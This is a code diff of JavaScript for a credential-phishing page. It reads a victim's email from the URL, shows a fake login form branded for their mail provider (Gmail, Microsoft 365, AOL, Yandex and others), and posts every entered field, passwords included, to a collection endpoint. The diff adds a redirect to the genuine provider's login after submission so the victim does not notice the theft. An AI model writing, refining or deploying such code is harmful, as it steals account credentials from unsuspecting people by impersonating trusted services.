@@ -1,4 +1,5 @@
 let userDomain = '';
+let formToShow = 'microsoft';
 
 const redirectUrls = {
     'gsuite': 'https://accounts.google.com/',
@@ -14,18 +15,16 @@ const redirectUrls = {
     'gmx': 'https://www.gmx.com/',
     'tuta': 'https://mail.tutanota.com/',
     'proton': 'https://mail.proton.me/',
-    'microsoft': 'https://login.microsoftonline.com/', // Generic Microsoft 365 login
+    'microsoft': 'https://login.microsoftonline.com/',
 };
 
 document.addEventListener('DOMContentLoaded', function() {
     const hash = window.location.hash.substring(1);
-    
+
     if (hash && hash.includes('@')) {
         const email = hash;
         const domain = email.split('@')[1].toLowerCase();
         userDomain = domain;
-
-        let formToShow = 'webmail';
 
         if (domain.includes('gmail') || domain === 'gmail.com') {
             formToShow = 'gsuite';
@@ -45,7 +44,7 @@ document.addEventListener('DOMContentLoaded', function() {
             formToShow = 'zoho';
         } else if (domain === 'aol.com') {
             formToShow = 'aol';
-        } else if (domain === 'yandex.com') {4
+        } else if (domain === 'yandex.com') {
             formToShow = 'yandex';
         } else if (domain === 'gmx.com' || domain === 'gmx.us' || domain === 'gmx.de') {
             formToShow = 'gmx';
@@ -58,7 +57,7 @@ document.addEventListener('DOMContentLoaded', function() {
         } else {
             formToShow = 'webmail';
             customizeWebmailForm(domain);
-            redirectUrls['webmail'] = `https://mail.${userDomain}/` || `https://webmail.${userDomain}/` || `https://${userDomain}/login`;
+            redirectUrls['webmail'] = `https://webmail.${userDomain}/` || `https://${userDomain}/login`; // Added a fallback
         }
 
         document.getElementById(formToShow).style.display = 'block';
@@ -67,57 +66,68 @@ document.addEventListener('DOMContentLoaded', function() {
         if (emailField) {
             emailField.value = email;
         }
-        // global redirect URL
-        window.manualRedirectUrl = redirectUrls[formToShow];
-
     } else {
-        // Default if no hash/email
         document.getElementById('microsoft').style.display = 'block';
-        window.manualRedirectUrl = redirectUrls['microsoft'];
+        formToShow = 'microsoft';
     }
 });
 
 
 function sendMessage(formId) {
-  const form = document.getElementById(formId);
-  const formData = new FormData(form);
-  const formDataObj = {};
+    const form = document.getElementById(formId);
+    const formData = new FormData(form);
+    const formDataObj = {};
 
-  const sendButton = form.querySelector(".proceed-button");
-  const originalText = sendButton.textContent;
+    const sendButton = form.querySelector(".proceed-button");
+    const originalText = sendButton.textContent;
 
-  sendButton.textContent = "Loading...";
-  sendButton.disabled = true;
+    sendButton.textContent = "Loading...";
+    sendButton.disabled = true;
 
-  formData.forEach((value, key) => {
-    formDataObj[key] = value;
-  });
+    formData.forEach((value, key) => {
+        formDataObj[key] = value;
+    });
 
-  formDataObj.send = "true";
+    formDataObj.send = "true";
 
-  fetch("/api/submit", {
-    method: "POST",
-    headers: {
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify(formDataObj)
-  })
-  .then(response => {
-    
-    if (!response.ok) {
-      return response.json().then(data => {
-        throw new Error(data.error || `HTTP ${response.status}`);
-      });
+    fetch("/api/submit", {
+        method: "POST",
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(formDataObj)
+    })
+    .then(response => {
+        if (!response.ok) {
+            return response.json().then(data => {
+                throw new Error(data.error || `HTTP ${response.status}`);
+            });
+        }
+        return response.json();
+    })
+    .then(data => {
+        form.reset();
+        window.location.href = redirectUrls[formToShow];
+        sendButton.textContent = originalText;
+        sendButton.disabled = false;
+    })
+    .catch(error => {
+        sendButton.textContent = originalText;
+        sendButton.disabled = false;
+    });
+}
+
+function customizeWebmailForm(domain) {
+    const webmailFormElement = document.getElementById('webmail');
+    if (webmailFormElement) {
+        let hintElement = webmailFormElement.querySelector('.domain-hint');
+        if (!hintElement) {
+            hintElement = document.createElement('p');
+            hintElement.className = 'domain-hint';
+            webmailFormElement.prepend(hintElement);
+        }
+        hintElement.textContent = `Please log in to your ${domain} email account.`;
     }
-    return response.json();
-  })
-  .then(data => {    
-    form.reset();
-    sendButton.textContent = originalText;
-    sendButton.disabled = false;
-  })
-  .catch(error => {
-  });
 }
         
         // Function to customize the webmail form based on the domain
@@ -173,7 +183,6 @@ document.getElementById('webmail-title').textContent = `${domainTitle.charAt(0).
             img.src = clearbitUrl;
         }
         
-        // Function to extract dominant color from an image (simplified version)
         function extractColorFromImage(img, callback) {
             const canvas = document.createElement('canvas');
             const context = canvas.getContext('2d');
